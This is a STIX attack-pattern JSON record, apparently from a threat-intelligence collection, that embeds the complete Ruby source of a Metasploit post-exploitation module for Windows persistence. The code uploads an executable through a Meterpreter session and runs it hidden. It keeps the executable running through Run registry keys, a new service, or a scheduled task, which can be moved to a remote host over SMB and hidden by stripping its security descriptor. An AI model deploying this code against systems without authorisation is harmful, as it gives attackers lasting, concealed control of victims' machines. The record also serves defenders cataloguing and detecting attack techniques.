{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3e6f3477-7baa-4d5f-92d9-fa579a2bed99",
    "created": "2024-08-14T16:33:04.983864Z",
    "modified": "2024-08-14T16:33:04.983868Z",
    "name": "Windows Manage Persistent EXE Payload Installer",
    "description": " This Module will upload an executable to a remote host and make it Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login SYSTEM will start on system boot but requires privs. SERVICE will create a new service which will start the payload. Again requires privs.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/persistence_exe.rb",
            "external_id": "persistence_exe.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Services\n  include Msf::Post::Windows::TaskScheduler\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Persistent EXE Payload Installer',\n        'Description' => %q{\n          This Module will upload an executable to a remote host and make it Persistent.\n          It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login,\n          SYSTEM will start on system boot but requires privs. SERVICE will create a new service\n          which will start the payload. Again requires privs.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Merlyn drforbin Cousins <drforbin6[at]gmail.com>' ],\n        'Version' => '$Revision:1$',\n        'Platform' => [ 'windows' ],\n        'SessionTypes' => [ 'meterpreter'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_sys_config_getenv\n              stdapi_sys_config_sysinfo\n              stdapi_sys_process_execute\n            ]\n          }\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptEnum.new('STARTUP', [true, 'Startup type for the persistent payload.', 'USER', ['USER', 'SYSTEM', 'SERVICE', 'TASK']]),\n        OptPath.new('REXEPATH', [true, 'The remote executable to upload and execute.']),\n        OptString.new('REXENAME', [true, 'The name to call exe on remote system', 'default.exe']),\n        OptBool.new('RUN_NOW', [false, 'Run the installed payload immediately.', true]),\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('LocalExePath', [false, 'The local exe path to run. Use temp directory as default. ']),\n        OptString.new('RemoteExePath', [\n          false,\n          'The remote path to move the payload to. Only valid when the STARTUP option is set '\\\n          'to TASK and the `ScheduleRemoteSystem` option is set. Use the same path than LocalExePath '\\\n          'if not set.'\n        ], conditions: ['STARTUP', '==', 'TASK']),\n        OptString.new('StartupName', [false, 'The name of service, registry or scheduled task. Random string as default.' ]),\n        OptString.new('ServiceDescription', [false, 'The description of service. Random string as default.' ])\n      ]\n    )\n  end\n\n  # Run Method for when run command is issued\n  #-------------------------------------------------------------------------------\n  def run\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n\n    # Set vars\n    rexe = datastore['REXEPATH']\n    rexename = datastore['REXENAME']\n    host, _port = session.tunnel_peer.split(':')\n    @clean_up_rc = ''\n\n    raw = create_payload_from_file rexe\n\n    # Write script to %TEMP% on target\n    script_on_target = write_exe_to_target(raw, rexename)\n\n    # Initial execution of script\n    target_exec(script_on_target) if datastore['RUN_NOW']\n\n    case datastore['STARTUP'].upcase\n    when 'USER'\n      write_to_reg('HKCU', script_on_target)\n    when 'SYSTEM'\n      write_to_reg('HKLM', script_on_target)\n    when 'SERVICE'\n      install_as_service(script_on_target)\n    when 'TASK'\n      create_scheduler_task(script_on_target)\n    end\n\n    clean_rc = log_file\n    file_local_write(clean_rc, @clean_up_rc)\n    print_status(\"Cleanup Meterpreter RC File: #{clean_rc}\")\n\n    report_note(host: host,\n                type: 'host.persistance.cleanup',\n                data: {\n                  local_id: session.sid,\n                  stype: session.type,\n                  desc: session.info,\n                  platform: session.platform,\n                  via_payload: session.via_payload,\n                  via_exploit: session.via_exploit,\n                  created_at: Time.now.utc,\n                  commands: @clean_up_rc\n                })\n  end\n\n  # Function for creating log folder and returning log path\n  #-------------------------------------------------------------------------------\n  def log_file(log_path = nil)\n    # Get hostname\n    if datastore['STARTUP'] == 'TASK' && @cleanup_host\n      # Use the remote hostname when remote task creation is selected\n      # Cleanup will have to be performed on this remote host\n      host = @cleanup_host\n    else\n      host = session.sys.config.sysinfo['Computer']\n    end\n\n    # Create Filename info to be appended to downloaded files\n    filenameinfo = '_' + ::Time.now.strftime('%Y%m%d.%M%S')\n\n    # Create a directory for the logs\n    logs = if log_path\n             ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))\n           else\n             ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))\n           end\n\n    # Create the log directory\n    ::FileUtils.mkdir_p(logs)\n\n    # logfile name\n    logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + '.rc'\n    logfile\n  end\n\n  # Function to execute script on target and return the PID of the process\n  #-------------------------------------------------------------------------------\n  def target_exec(script_on_target)\n    print_status(\"Executing script #{script_on_target}\")\n    proc = session.sys.process.execute(script_on_target, nil, 'Hidden' => true)\n    print_good(\"Agent executed with PID #{proc.pid}\")\n    @clean_up_rc << \"kill #{proc.pid}\\n\"\n    proc.pid\n  end\n\n  # Function to install payload in to the registry HKLM or HKCU\n  #-------------------------------------------------------------------------------\n  def write_to_reg(key, script_on_target)\n    nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8..15))\n    print_status(\"Installing into autorun as #{key}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\#{nam}\")\n    if key\n      registry_setvaldata(\"#{key}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", nam, script_on_target, 'REG_SZ')\n      print_good(\"Installed into autorun as #{key}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\#{nam}\")\n      @clean_up_rc << \"reg deleteval -k '#{key}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -v '#{nam}'\\n\"\n    else\n      print_error('Error: failed to open the registry key for writing')\n    end\n  end\n\n  # Function to install payload as a service\n  #-------------------------------------------------------------------------------\n  def install_as_service(script_on_target)\n    if is_system? || is_admin?\n      print_status('Installing as service..')\n      nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8..15))\n      description = datastore['ServiceDescription'] || Rex::Text.rand_text_alpha(8)\n      print_status(\"Creating service #{nam}\")\n\n      key = service_create(nam, path: \"cmd /c \\\"#{script_on_target}\\\"\", display: description)\n\n      # check if service had been created\n      if key != 0\n        print_error(\"Service #{nam} creating failed.\")\n        return\n      end\n\n      # if service is stopped, then start it.\n      service_start(nam) if datastore['RUN_NOW'] && service_status(nam)[:state] == 1\n\n      @clean_up_rc << \"execute -H -f sc -a \\\"delete #{nam}\\\"\\n\"\n    else\n      print_error('Insufficient privileges to create service')\n    end\n  end\n\n  # Function for writing executable to target host\n  #-------------------------------------------------------------------------------\n  def write_exe_to_target(rexe, rexename)\n    # check if we have write permission\n    # I made it by myself because the function filestat.writable? was not implemented yet.\n    if !datastore['LocalExePath'].nil?\n\n      begin\n        temprexe = datastore['LocalExePath'] + '\\\\' + rexename\n        write_file_to_target(temprexe, rexe)\n      rescue Rex::Post::Meterpreter::RequestError\n        print_warning(\"Insufficient privileges to write in #{datastore['LocalExePath']}, writing to %TEMP%\")\n        temprexe = session.sys.config.getenv('TEMP') + '\\\\' + rexename\n        write_file_to_target(temprexe, rexe)\n      end\n\n    # Write to %temp% directory if not set LocalExePath\n    else\n      temprexe = session.sys.config.getenv('TEMP') + '\\\\' + rexename\n      write_file_to_target(temprexe, rexe)\n    end\n\n    print_good(\"Persistent Script written to #{temprexe}\")\n    @clean_up_rc << \"rm #{temprexe.gsub('\\\\', '\\\\\\\\\\\\\\\\')}\\n\"\n    temprexe\n  end\n\n  def write_file_to_target(temprexe, rexe)\n    fd = session.fs.file.new(temprexe, 'wb')\n    fd.write(rexe)\n    fd.close\n  end\n\n  # Function to create executable from a file\n  #-------------------------------------------------------------------------------\n  def create_payload_from_file(exec)\n    print_status(\"Reading Payload from file #{exec}\")\n    File.binread(exec)\n  end\n\n  def move_to_remote(remote_host, script_on_target, remote_path)\n    print_status(\"Moving payload file to the remote host (#{remote_host})\")\n\n    # Translate local path to remote path. Basically, change any \"<drive letter>:\" to \"<drive letter>$\"\n    remote_path = remote_path.split('\\\\').delete_if(&:empty?)\n    remote_exe = remote_path.pop\n    remote_path[0].sub!(/^(?<drive>[A-Z]):/i, '\\k<drive>$') unless remote_path.empty?\n    remote_path.prepend(remote_host)\n    remote_path = \"\\\\\\\\#{remote_path.join('\\\\')}\"\n    cmd = \"net use #{remote_path}\"\n    if datastore['ScheduleUsername'].present?\n      cmd << \" /user:#{datastore['ScheduleUsername']}\"\n      cmd << \" #{datastore['SchedulePassword']}\" if datastore['SchedulePassword'].present?\n    end\n\n    vprint_status(\"Executing command: #{cmd}\")\n    result = cmd_exec_with_result(cmd)\n    unless result[1]\n      print_error(\n        'Unable to connect to the remote host. Check credentials, `RemoteExePath`, '\\\n        \"`LocalExePath` and SMB version compatibility on both hosts. Error: #{result[0]}\"\n      )\n      return false\n    end\n\n    # #move_file helper does not work when the target is a remote host and the session run as SYSTEM. It works with #cmd_exec.\n    result = cmd_exec_with_result(\"move /y \\\"#{script_on_target}\\\" \\\"#{remote_path}\\\\#{remote_exe}\\\"\")\n    if result[1]\n      print_good(\"Moved #{script_on_target} to #{remote_path}\\\\#{remote_exe}\")\n    else\n      print_error(\"Unable to move the file to the remote host. Error: #{result[0]}\")\n    end\n\n    result = cmd_exec_with_result(\"net use #{remote_path} /delete\")\n    unless result[1]\n      print_warning(\"Unable to close the network connection with the remote host. This will have to be done manually. Error: #{result[0]}\")\n    end\n\n    return !!result\n  end\n\n  TaskSch = Msf::Post::Windows::TaskScheduler\n\n  def create_scheduler_task(script_on_target)\n    unless is_system? || is_admin?\n      print_error('Insufficient privileges to create a scheduler task')\n      return\n    end\n\n    remote_host = datastore['ScheduleRemoteSystem']\n    print_status(\"Creating a #{datastore['ScheduleType']} scheduler task#{\" on #{remote_host}\" if remote_host.present?}\")\n\n    if remote_host.present?\n      remote_path = script_on_target\n      if datastore['RemoteExePath'].present?\n        remote_path = datastore['RemoteExePath'].split('\\\\').delete_if(&:empty?).join('\\\\')\n        remote_path = \"#{remote_path}\\\\#{datastore['REXENAME']}\"\n      end\n      return false unless move_to_remote(remote_host, script_on_target, remote_path)\n\n      @cleanup_host = remote_host\n      @clean_up_rc = \"rm #{remote_path.gsub('\\\\', '\\\\\\\\\\\\\\\\')}\\n\"\n    end\n\n    task_name = datastore['StartupName'].present? ? datastore['StartupName'] : Rex::Text.rand_text_alpha(rand(8..15))\n\n    print_status(\"Task name: '#{task_name}'\")\n    if datastore['ScheduleObfuscationTechnique'] == 'SECURITY_DESC'\n      print_status('Also, removing the Security Descriptor registry key value to hide the task')\n    end\n    if datastore['ScheduleRemoteSystem'].present?\n      if Rex::Socket.dotted_ip?(datastore['ScheduleRemoteSystem'])\n        print_warning(\n          \"The task will be created on the remote host #{datastore['ScheduleRemoteSystem']} and since \"\\\n          'the FQDN is not used, it usually takes some time (> 1 min) due to some DNS resolution'\\\n          ' happening in the background'\n        )\n        if datastore['ScheduleObfuscationTechnique'] != 'SECURITY_DESC'\n          print_warning(\n            'Also, since the \\'ScheduleObfuscationTechnique\\' option is set to '\\\n            'SECURITY_DESC, it will take much more time to be executed on the '\\\n            'remote host for the same reasons (> 3 min). Don\\'t Ctrl-C, even if '\\\n            'a session pops up, be patient or use a FQDN in `ScheduleRemoteSystem` option.'\n          )\n        end\n      end\n      @clean_up_rc = \"# The 'rm' command won t probably succeed while you're interacting with the session\\n\"\\\n                     \"# You should migrate to another process to be able to remove the payload file\\n\"\\\n                     \"#{@clean_up_rc}\"\n    end\n\n    begin\n      task_create(task_name, remote_host.blank? ? script_on_target : remote_path)\n    rescue TaskSchedulerObfuscationError => e\n      print_warning(e.message)\n      print_good('Task created without obfuscation')\n    rescue TaskSchedulerError => e\n      print_error(\"Task creation error: #{e}\")\n      return\n    else\n      print_good('Task created')\n      if datastore['ScheduleObfuscationTechnique'] == 'SECURITY_DESC'\n        @clean_up_rc << \"reg setval -k '#{TaskSch::TASK_REG_KEY.gsub('\\\\') { '\\\\\\\\' }}\\\\\\\\#{task_name}' \"\\\n                        \"-v '#{TaskSch::TASK_SD_REG_VALUE}' \"\\\n                        \"-d '#{TaskSch::DEFAULT_SD}' \"\\\n                        \"-t 'REG_BINARY'#{\" -w '64'\" unless @old_os}\\n\"\n      end\n    end\n\n    @clean_up_rc << \"execute -H -f schtasks -a \\\"/delete /tn #{task_name} /f\\\"\\n\"\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'windows' ]"
    ]
}